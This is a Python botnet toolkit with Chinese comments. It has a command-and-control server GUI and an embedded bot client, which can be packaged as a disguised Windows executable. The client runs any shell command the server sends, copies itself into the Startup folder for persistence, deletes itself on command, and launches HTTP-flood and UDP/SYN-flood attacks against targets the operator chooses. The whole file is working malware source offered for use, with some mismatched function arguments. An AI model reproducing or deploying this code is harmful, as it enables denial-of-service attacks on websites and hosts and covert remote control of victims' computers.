import os
import socket
import threading
import time
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox, simpledialog, filedialog
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# 共享密钥，需要与客户端保持一致
KEY = b'your_secret_key_32_bytes'

version = "v1.0"

ddos_title = """
    _____  _____  _______ _______ 
   |     \|     \|       |     __|
   |  --  |  --  |   -   |__     |
   |_____/|_____/|_______|_______|
=======================================
"""

cc_title = """
             ______ ______ 
            |      |      |
            |   ---|   ---|
            |______|______|
=======================================
"""

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    iv = cipher.iv
    return iv + ciphertext

def decrypt(data):
    iv = data[:AES.block_size]
    ciphertext = data[AES.block_size:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_data.decode('utf-8')

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = None
        self.clients = {}
        self.client_ips = set()
        self.server_running = False
        self.check_client_file()
        self.create_gui()

    def check_client_file(self):
        if not os.path.exists("client-create.txt"):
            client_code = self.get_client_code()
            with open("client-create.txt", "w", encoding="utf-8") as f:
                f.write(client_code)

    def get_client_code(self):
        return """# =========================================== cc ===========================================

import os
import time
import threading
import random
import requests
from requests.exceptions import RequestException
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# 常量定义
START_TIME = 5
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# 共享密钥，需要与服务器保持一致
KEY = b'your_secret_key_32_bytes'

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ciphertext = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    iv = cipher.iv
    return iv + ciphertext

def decrypt(data):
    iv = data[:AES.block_size]
    ciphertext = data[AES.block_size:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_data.decode('utf-8')

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_headers():
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    }
    try:
        if os.path.exists("cc_headers.txt"):
            with open("cc_headers.txt", "r", encoding="utf-8") as f:
                for line in f:
                    if ':' in line:
                        key, value = line.strip().split(':', 1)
                        headers[key.strip()] = value.strip()
    except Exception as e:
        print(f"[警告] 加载自定义头文件失败: {str(e)}")
    return headers

def send_request(url, timeout=10):
    try:
        headers = load_headers()
        time.sleep(random.uniform(0.1, 0.5))
        response = requests.get(
            url,
            headers=headers,
            timeout=timeout,
            verify=False
        )
        if random.random() < 0.3:
            print(f"[{threading.current_thread().name}] 请求成功 | 状态码: {response.status_code}")
        return True
    except RequestException as e:
        if random.random() < 0.2:
            print(f"[{threading.current_thread().name}] 请求异常: {str(e)}")
        return False

def worker(url, interval):
    try:
        while not exit_flag:
            success = send_request(url)
            if not success:
                time.sleep(1)
            sleep_time = interval * random.uniform(0.8, 1.2)
            time.sleep(max(0.1, sleep_time))
    except Exception as e:
        print(f"[严重错误] 工作线程崩溃: {str(e)}")

exit_flag = False

def cc(url, threads_num, interval):
    global exit_flag
    clear_screen()
    try:
        for i in range(START_TIME, 0, -1):
            time.sleep(1)
    except KeyboardInterrupt:
        return
    threads = []
    try:
        for i in range(threads_num):
            t = threading.Thread(
                target=worker,
                args=(url, interval),
                name=f"Worker-{i+1}"
            )
            t.daemon = True
            t.start()
            threads.append(t)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("接收到停止信号...")
        exit_flag = True
        for t in threads:
            t.join(2)
    finally:
        print("攻击已完全停止")

# ==========================================================================================

# ========================================= ddos ===========================================

import os
import sys
import time
import socket
import random
import threading
import struct

def dos(ip, ports, packet_types, threads):
    family = socket.AF_INET6 if ':' in ip else socket.AF_INET
    counter = 0
    lock = threading.Lock()
    running = True
    sockets = []
    def create_syn_packet():
        src_port = random.randint(1024, 65535)
        dst_port = random.choice(ports)
        seq_num = random.randint(0, 4294967295)
        ack_num = 0
        data_offset = 5 << 4
        flags = 0x02
        window = socket.htons(5840)
        checksum = 0
        urg_ptr = 0
        if family == socket.AF_INET:
            src_addr = socket.inet_pton(socket.AF_INET, '0.0.0.0')
            dst_addr = socket.inet_pton(socket.AF_INET, ip)
            protocol = socket.IPPROTO_TCP
            tcp_length = 20
            pseudo_header = struct.pack('!4s4sBBH',
                                        src_addr,
                                        dst_addr,
                                        0,
                                        protocol,
                                        tcp_length)
        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port,
                                 dst_port,
                                 seq_num,
                                 ack_num,
                                 data_offset,
                                 flags,
                                 window,
                                 checksum,
                                 urg_ptr)
        return tcp_header

    def create_udp_packet():
        return random._urandom(1490)
    def attack_port(port):
        nonlocal counter
        try:
            sock = socket.socket(family, socket.SOCK_DGRAM if 'udp' in packet_types else socket.SOCK_RAW)
            sockets.append(sock)
            while running:
                try:
                    for ptype in packet_types:
                        if ptype == 'udp':
                            packet = create_udp_packet()
                            sock.sendto(packet, (ip, port))
                        elif ptype == 'syn':
                            packet = create_syn_packet()
                            sock.sendto(packet, (ip, port))

                        with lock:
                            counter += 1
                            if counter % 100 == 0:
                                ports_str = ','.join(map(str, ports))
                                types_str = ','.join(packet_types)

                    time.sleep(0)  # 速度固定为 1000
                except socket.error as e:
                    print(f"网络错误: {e}")
                    break
                except Exception as e:
                    print(f"未知错误: {e}")
                    break
        except Exception as e:
            print(f"创建socket错误: {e}")
    try:
        threads_per_port = max(1, threads // len(ports))
        for port in ports:
            for _ in range(threads_per_port):
                thread = threading.Thread(target=attack_port, args=(port,))
                thread.daemon = True
                thread.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            running = False
            time.sleep(1)
    finally:
        for sock in sockets:
            try:
                sock.close()
            except:
                pass

        print(f"总共发送了 {counter} 个数据包")

# ==========================================================================================

import os
import socket
import threading
import time
import subprocess
import base64
import sys
import shutil
import platform

SERVER_IP = '127.0.0.1'
SERVER_PORT = 1000

AUTO_START = False

def auto_start():
    if AUTO_START:
        try:
            current_path = os.path.abspath(sys.argv[0])
            if not current_path.endswith('.exe'):
                return
            if platform.system() == 'Windows':
                startup_folder = os.path.join(
                    os.getenv('APPDATA', ''),
                    'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
                )
                if not os.path.exists(startup_folder):
                    os.makedirs(startup_folder, exist_ok=True)
                target_path = os.path.join(startup_folder, os.path.basename(current_path))
                if os.path.exists(current_path) and os.path.isfile(current_path):
                    shutil.copy2(current_path, target_path)
        except Exception as e:
            print(f"开机自启设置失败: {str(e)}")


def delete_self():
    try:
        current_path = os.path.abspath(sys.argv[0])
        if platform.system() == 'Windows':
            startup_folder = os.path.join(
                os.getenv('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
            startup_file = os.path.join(startup_folder, os.path.basename(current_path))
            if os.path.exists(startup_file):
                os.remove(startup_file)
        if current_path.endswith('.exe'):
            batch_file = os.path.join(os.path.dirname(current_path), 'delete_me.bat')
            with open(batch_file, 'w', encoding='gbk') as f:
                f.write('@echo off')
                f.write('timeout /t 1 /nobreak >nul')
                f.write(f'del /f /q "{current_path}"')
                f.write(f'del /f /q "{batch_file}"')
            subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
    except Exception as e:
        print(f"自删除失败: {str(e)}")
        sys.exit(1)

def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(10)
            client.connect((SERVER_IP, SERVER_PORT))
            print(f"[+] 成功连接到服务器: {SERVER_IP}:{SERVER_PORT}")
            while True:
                try:
                    client.settimeout(30)
                    encrypted_command = client.recv(4096)
                    if not encrypted_command:
                        break
                    command = decrypt(encrypted_command)
                    if command.strip() == 'delete_self':
                        delete_self()
                        break
                    output = execute_command(command)
                    encrypted_output = encrypt(output)
                    client.send(encrypted_output)
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[!] 命令处理异常: {str(e)}")
                    break
            client.close()
            print(f"[-] 与服务器断开连接，5秒后重试...")
        except socket.timeout:
            print(f"[!] 连接超时，正在重试连接服务器...")
        except ConnectionRefusedError:
            print(f"[!] 服务器连接拒绝，请检查服务器是否运行在 {SERVER_IP}:{SERVER_PORT}")
        except Exception as e:
            print(f"[!] 连接异常: {str(e)}")
        time.sleep(5)

def execute_command(command):
    try:
        if command.startswith('dos'):
            return dos_attack(command)
        elif command.startswith('cc'):
            return cc_attack(command)
        else:
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                errors='replace',
                timeout=30
            )
            return result.stdout or "命令执行成功（无输出）"
    except subprocess.TimeoutExpired:
        return "命令执行超时"
    except Exception as e:
        return f"命令执行错误: {str(e)}"


def dos_attack(command):
    try:
        parts = command.split()
        if len(parts) < 5:
            return "DOS攻击参数不足"

        protocol, target, port_str, thread_str = parts[1:5]
        ports = port_str.split(',')
        try:
            threads = int(thread_str)
        except:
            threads = 100

        print(f"[DOS] 启动 - 协议:{protocol} 目标:{target} 端口:{ports} 线程:{threads}")
        dos(target, ports, threads, packet_types=protocol)
        return f"[DOS] 启动 - 协议:{protocol} 目标:{target} 端口:{ports} 线程:{threads}"
    except Exception as e:
        return f"DOS 错误: {str(e)}"


def cc_attack(command):
    try:
        parts = command.split()
        if len(parts) < 3:
            return "CC攻击参数不足"

        url, thread_str = parts[1:3]
        try:
            threads = int(thread_str)
        except:
            threads = 100
        headers = ' '.join(parts[3:]).replace('_', ' ') if len(parts) > 3 else "默认请求头"
        print(f"[CC] 启动 - 网址:{url} 线程:{threads} 头信息:{headers}")
        cc(url, threads, headers, interval=0)
        return f"[CC] 启动 - 网址:{url} 线程:{threads} 头信息:{headers}"
    except Exception as e:
        return f"CC 错误: {str(e)}"


if __name__ == '__main__':
    try:
        auto_start()
        connect_to_server()
    except Exception as e:
        print(f"程序启动异常: {str(e)}")
        sys.exit(1)"""

    def create_gui(self):
        self.root = tk.Tk()
        self.root.title(f"BOTNET 服务器 - {self.host}:{self.port}")
        self.root.geometry("800x600")
        self.create_menu()
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.pack(fill=tk.BOTH, expand=True)
        client_frame = ttk.LabelFrame(main_frame, text="客户端列表")
        client_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        columns = ("IP地址", "端口", "连接时间", "状态")
        self.client_tree = ttk.Treeview(client_frame, columns=columns, show="headings")
        for col in columns:
            self.client_tree.heading(col, text=col)
            self.client_tree.column(col, width=150, anchor=tk.CENTER)
        self.client_tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)
        scrollbar = ttk.Scrollbar(client_frame, orient=tk.VERTICAL, command=self.client_tree.yview)
        self.client_tree.configure(yscroll=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=5)
        ttk.Button(button_frame, text="删除选中客户端", command=self.delete_client).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="断开选中客户端", command=self.disconnect_client).pack(side=tk.LEFT, padx=5)
        ttk.Button(button_frame, text="刷新列表", command=self.refresh_clients).pack(side=tk.LEFT, padx=5)
        command_frame = ttk.LabelFrame(main_frame, text="命令发送")
        command_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        ttk.Label(command_frame, text="输入命令:").pack(anchor=tk.W)
        self.command_entry = ttk.Entry(command_frame, width=70)
        self.command_entry.pack(fill=tk.X, padx=5, pady=5)
        self.command_entry.bind("<Return>", lambda event: self.send_command())
        cmd_button_frame = ttk.Frame(command_frame)
        cmd_button_frame.pack(fill=tk.X, pady=5)
        ttk.Button(cmd_button_frame, text="发送命令", command=self.send_command).pack(side=tk.LEFT, padx=5)
        ttk.Button(cmd_button_frame, text="DOS攻击", command=self.show_dos_dialog).pack(side=tk.LEFT, padx=5)
        ttk.Button(cmd_button_frame, text="CC攻击", command=self.show_cc_dialog).pack(side=tk.LEFT, padx=5)
        ttk.Button(cmd_button_frame, text="创建客户端", command=self.create_client_dialog).pack(side=tk.LEFT, padx=5)
        status_frame = ttk.Frame(self.root)
        status_frame.pack(fill=tk.X, side=tk.BOTTOM)
        self.status_label = ttk.Label(status_frame, text=f"服务器已停止 - 客户端数量: 0")
        self.status_label.pack(side=tk.LEFT, padx=5)
        # 启动服务器按钮
        self.start_button = ttk.Button(status_frame, text="启动服务器", command=self.start_server)
        self.start_button.pack(side=tk.RIGHT, padx=5)

    def create_menu(self):
        menu_bar = tk.Menu(self.root)
        # 设置菜单
        settings_menu = tk.Menu(menu_bar, tearoff=0)
        settings_menu.add_command(label="设置监听IP", command=self.change_ip)
        settings_menu.add_command(label="设置监听端口", command=self.change_port)
        menu_bar.add_cascade(label="设置", menu=settings_menu)
        # 帮助菜单
        help_menu = tk.Menu(menu_bar, tearoff=0)
        help_menu.add_command(label="关于", command=self.show_about)
        menu_bar.add_cascade(label="帮助", menu=help_menu)

        self.root.config(menu=menu_bar)

    def change_ip(self):
        if self.server_running:
            messagebox.showerror("错误", "请先停止服务器再更改IP")
            return
        new_ip = simpledialog.askstring("设置IP", "请输入新的监听IP:", initialvalue=self.host)
        if new_ip:
            self.host = new_ip
            self.root.title(f"BOTNET 服务器 - {self.host}:{self.port}")

    def change_port(self):
        if self.server_running:
            messagebox.showerror("错误", "请先停止服务器再更改端口")
            return
        new_port = simpledialog.askinteger("设置端口", "请输入新的监听端口:", initialvalue=self.port, minvalue=1, maxvalue=65535)
        if new_port:
            self.port = new_port
            self.root.title(f"BOTNET 服务器 - {self.host}:{self.port}")

    def show_about(self):
        messagebox.showinfo("关于", f"BOTNET 2\n版本 {version}\n僵尸网络二代\n作者: X KaySure <XXX-STALKER>")

    def start_server(self):
        if self.server_running:
            self.stop_server()
            self.start_button.config(text="启动服务器")
            self.status_label.config(text=f"服务器已停止 - 客户端数量: {len(self.clients)}")
            return
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((self.host, self.port))
            self.server.listen(5)

            self.server_running = True
            self.start_button.config(text="停止服务器")
            self.status_label.config(text=f"服务器正在运行 - {self.host}:{self.port} - 客户端数量: {len(self.clients)}")
            # 启动接受客户端的线程
            accept_thread = threading.Thread(target=self.accept_clients)
            accept_thread.daemon = True
            accept_thread.start()
        except Exception as e:
            messagebox.showerror("错误", f"启动服务器失败: {str(e)}")

    def stop_server(self):
        self.server_running = False
        try:
            # 关闭所有客户端连接
            for ip, client in self.clients.items():
                client.close()
            self.clients.clear()
            self.client_ips.clear()
            self.refresh_clients()
            # 关闭服务器套接字
            if self.server:
                self.server.close()
        except:
            pass

    def accept_clients(self):
        while self.server_running:
            try:
                client, addr = self.server.accept()
                client_ip, client_port = addr
                # 检查是否已有相同IP的客户端连接
                if client_ip in self.client_ips:
                    client.close()
                    continue
                self.client_ips.add(client_ip)
                self.clients[client_ip] = client
                # 更新客户端列表
                self.refresh_clients()
                self.status_label.config(text=f"服务器正在运行 - {self.host}:{self.port} - 客户端数量: {len(self.clients)}")
                # 启动接收客户端消息的线程
                receive_thread = threading.Thread(target=self.receive_client_messages, args=(client, client_ip))
                receive_thread.daemon = True
                receive_thread.start()
            except Exception as e:
                if self.server_running:
                    print(f"接受客户端连接错误: {str(e)}")
                break

    def receive_client_messages(self, client, client_ip):
        while True:
            try:
                encrypted_message = client.recv(4096)
                if not encrypted_message:
                    break
                message = decrypt(encrypted_message)
                print(f"来自 {client_ip} 的消息: {message}")
            except Exception as e:
                break
        self.remove_client(client_ip)

    def remove_client(self, client_ip):
        if client_ip in self.clients:
            try:
                self.clients[client_ip].close()
            except:
                pass
            del self.clients[client_ip]
            self.client_ips.discard(client_ip)
            self.refresh_clients()
            self.status_label.config(text=f"服务器正在运行 - {self.host}:{self.port} - 客户端数量: {len(self.clients)}")

    def refresh_clients(self):
        # 清空现有列表
        for item in self.client_tree.get_children():
            self.client_tree.delete(item)
        # 添加客户端
        for ip, client in self.clients.items():
            try:
                client.send(b'')
                status = "在线"
                connect_time = time.strftime("%Y-%m-%d %H:%M:%S")
            except:
                status = "离线"
                connect_time = "未知"

            self.client_tree.insert("", tk.END, values=(ip, client.getpeername()[1], connect_time, status))

    def delete_client(self):
        selected_items = self.client_tree.selection()
        if not selected_items:
            messagebox.showinfo("提示", "请先选择要删除的客户端")
            return
        for item in selected_items:
            values = self.client_tree.item(item, "values")
            client_ip = values[0]
            if client_ip in self.clients:
                try:
                    encrypted_command = encrypt("delete_self")
                    self.clients[client_ip].send(encrypted_command)
                except:
                    pass
                self.remove_client(client_ip)
        messagebox.showinfo("提示", "已发送删除命令到选中的客户端")

    def disconnect_client(self):
        selected_items = self.client_tree.selection()
        if not selected_items:
            messagebox.showinfo("提示", "请先选择要断开的客户端")
            return
        for item in selected_items:
            values = self.client_tree.item(item, "values")
            client_ip = values[0]
            if client_ip in self.clients:
                try:
                    self.clients[client_ip].close()
                except:
                    pass
                self.remove_client(client_ip)
        messagebox.showinfo("提示", "已断开选中的客户端连接")

    def send_command(self):
        command = self.command_entry.get().strip()
        if not command:
            return
        encrypted_command = encrypt(command)
        for ip, client in self.clients.items():
            try:
                client.send(encrypted_command)
            except:
                self.remove_client(ip)

        self.command_entry.delete(0, tk.END)
        messagebox.showinfo("提示", f"已发送命令到 {len(self.clients)} 个客户端")

    def show_dos_dialog(self):
        print(ddos_title)
        dos_window = tk.Toplevel(self.root)
        dos_window.title("DOS攻击")
        dos_window.geometry("400x300")
        dos_window.resizable(False, False)
        # 协议选择
        ttk.Label(dos_window, text="选择协议:").pack(anchor=tk.W, padx=10, pady=5)
        protocol_var = tk.StringVar(value="udp")
        ttk.Radiobutton(dos_window, text="UDP", variable=protocol_var, value="udp").pack(anchor=tk.W, padx=20)
        ttk.Radiobutton(dos_window, text="SYN", variable=protocol_var, value="syn").pack(anchor=tk.W, padx=20)
        # 目标IP
        ttk.Label(dos_window, text="目标IP:").pack(anchor=tk.W, padx=10, pady=5)
        target_ip = ttk.Entry(dos_window, width=30)
        target_ip.pack(anchor=tk.W, padx=10)
        # 端口
        ttk.Label(dos_window, text="端口(用逗号分隔):").pack(anchor=tk.W, padx=10, pady=5)
        ports = ttk.Entry(dos_window, width=30)
        ports.pack(anchor=tk.W, padx=10)
        # 线程数
        ttk.Label(dos_window, text="线程数:").pack(anchor=tk.W, padx=10, pady=5)
        threads = ttk.Entry(dos_window, width=30)
        threads.pack(anchor=tk.W, padx=10)
        def send_dos_command():
            if not target_ip.get() or not ports.get() or not threads.get():
                messagebox.showerror("错误", "请填写所有字段")
                return
            command = f"dos {protocol_var.get()} {target_ip.get()} {ports.get()} {threads.get()}"
            encrypted_command = encrypt(command)
            for ip, client in self.clients.items():
                try:
                    client.send(encrypted_command)
                except:
                    self.remove_client(ip)
            messagebox.showinfo("提示", f"已发送DOS攻击命令到 {len(self.clients)} 个客户端")
            print(command)
            dos_window.destroy()
        ttk.Button(dos_window, text="确定", command=send_dos_command).pack(pady=10)

    def show_cc_dialog(self):
        print(cc_title)
        cc_window = tk.Toplevel(self.root)
        cc_window.title("CC攻击")
        cc_window.geometry("400x350")
        cc_window.resizable(False, False)
        # 网站URL
        ttk.Label(cc_window, text="网站URL:").pack(anchor=tk.W, padx=10, pady=5)
        url = ttk.Entry(cc_window, width=30)
        url.pack(anchor=tk.W, padx=10)
        # 线程数
        ttk.Label(cc_window, text="线程数:").pack(anchor=tk.W, padx=10, pady=5)
        threads = ttk.Entry(cc_window, width=30)
        threads.pack(anchor=tk.W, padx=10)
        # 请求头
        ttk.Label(cc_window, text="请求头(可选，用下划线代替空格):").pack(anchor=tk.W, padx=10, pady=5)
        headers = ttk.Entry(cc_window, width=30)
        headers.pack(anchor=tk.W, padx=10)
        # 使用默认请求头
        use_default = tk.BooleanVar(value=True)
        ttk.Checkbutton(cc_window, text="使用默认请求头", variable=use_default).pack(anchor=tk.W, padx=20, pady=5)
        def send_cc_command():
            if not url.get() or not threads.get():
                messagebox.showerror("错误", "请填写URL和线程数")
                return
            if not use_default.get() and not headers.get():
                messagebox.showerror("错误", "如果不使用默认请求头，请填写请求头")
                return
            headers_text = headers.get() if not use_default.get() else "User-Agent_Mozilla/5.0_(Windows_NT_10.0;_Win64;_x64)_AppleWebKit/537.36_(KHTML,_like_Gecko)_Chrome/91.0.4472.124_Safari/537.36"
            command = f"cc {url.get()} {threads.get()} {headers_text}"
            encrypted_command = encrypt(command)
            for ip, client in self.clients.items():
                try:
                    client.send(encrypted_command)
                except:
                    self.remove_client(ip)
            messagebox.showinfo("提示", f"已发送CC攻击命令到 {len(self.clients)} 个客户端")
            print(command)
            cc_window.destroy()
        ttk.Button(cc_window, text="确定", command=send_cc_command).pack(pady=10)

    def create_client_dialog(self):
        create_window = tk.Toplevel(self.root)
        create_window.title("创建客户端")
        create_window.geometry("450x400")
        create_window.resizable(False, False)
        # 服务器IP
        ttk.Label(create_window, text="服务器IP:").pack(anchor=tk.W, padx=10, pady=5)
        server_ip = ttk.Entry(create_window, width=30)
        server_ip.insert(0, self.host)
        server_ip.pack(anchor=tk.W, padx=10)
        # 服务器端口
        ttk.Label(create_window, text="服务器端口:").pack(anchor=tk.W, padx=10, pady=5)
        server_port = ttk.Entry(create_window, width=30)
        server_port.insert(0, str(self.port))
        server_port.pack(anchor=tk.W, padx=10)
        # 开机自启
        auto_start = tk.BooleanVar(value=False)
        ttk.Checkbutton(create_window, text="开机自启", variable=auto_start).pack(anchor=tk.W, padx=20, pady=5)
        # 图标文件
        icon_frame = ttk.Frame(create_window)
        icon_frame.pack(fill=tk.X, padx=10, pady=5)
        ttk.Label(icon_frame, text="图标文件(可选):").pack(anchor=tk.W, side=tk.LEFT)
        icon_path = ttk.Entry(icon_frame, width=25)
        icon_path.pack(anchor=tk.W, side=tk.LEFT, padx=5)
        def browse_icon():
            filename = filedialog.askopenfilename(filetypes=[("图标文件", "*.ico")])
            if filename:
                icon_path.delete(0, tk.END)
                icon_path.insert(0, filename)
        ttk.Button(icon_frame, text="浏览", command=browse_icon).pack(anchor=tk.W, side=tk.LEFT)
        output_frame = ttk.Frame(create_window)
        output_frame.pack(fill=tk.X, padx=10, pady=5)
        ttk.Label(output_frame, text="输出路径:").pack(anchor=tk.W, side=tk.LEFT)
        output_path = ttk.Entry(output_frame, width=25)
        output_path.pack(anchor=tk.W, side=tk.LEFT, padx=5)

        def browse_output():
            folder = filedialog.askdirectory()
            if folder:
                output_path.delete(0, tk.END)
                output_path.insert(0, folder)
        ttk.Button(output_frame, text="浏览", command=browse_output).pack(anchor=tk.W, side=tk.LEFT)
        def create_client():
            if not server_ip.get() or not server_port.get() or not output_path.get():
                messagebox.showerror("错误", "请填写所有必填字段")
                return
            try:
                client_code = self.get_client_code()
                client_code = client_code.replace("SERVER_IP = '127.0.0.1'", f"SERVER_IP = '{server_ip.get()}'")
                client_code = client_code.replace("SERVER_PORT = 9999", f"SERVER_PORT = {server_port.get()}")
                client_code = client_code.replace("AUTO_START = False", f"AUTO_START = {auto_start.get()}")
                if not os.path.exists("BOTNET-Script"):
                    os.makedirs("BOTNET-Script")
                client_file = os.path.join("BOTNET-Script", f"client_{server_ip.get()}_{server_port.get()}.py")
                with open(client_file, "w", encoding="utf-8") as f:
                    f.write(client_code)
                messagebox.showwarning("打包", "打包过程中可能会卡\n切勿退出！\n点击确定继续打包")
                cmd = ["pyinstaller", "--onefile", "--windowed"] # --noconsole
                # 添加图标
                if icon_path.get():
                    cmd.extend(["--icon", icon_path.get()])
                # 添加输出目录
                cmd.extend(["--distpath", output_path.get()])
                # 添加入口文件
                cmd.append(client_file)
                # 执行打包命令
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                stdout, stderr = process.communicate()
                if process.returncode != 0:
                    messagebox.showerror("错误", f"打包失败:\n{stderr.decode('utf-8', errors='ignore')}")
                else:
                    messagebox.showinfo("成功", f"客户端已成功创建并打包到:\n{output_path.get()}")
                    create_window.destroy()
            except Exception as e:
                messagebox.showerror("错误", f"创建客户端失败: {str(e)}")
        ttk.Button(create_window, text="创建", command=create_client).pack(pady=10)

if __name__ == "__main__":
    server = Server('127.0.0.1', 1000)
    server.root.mainloop()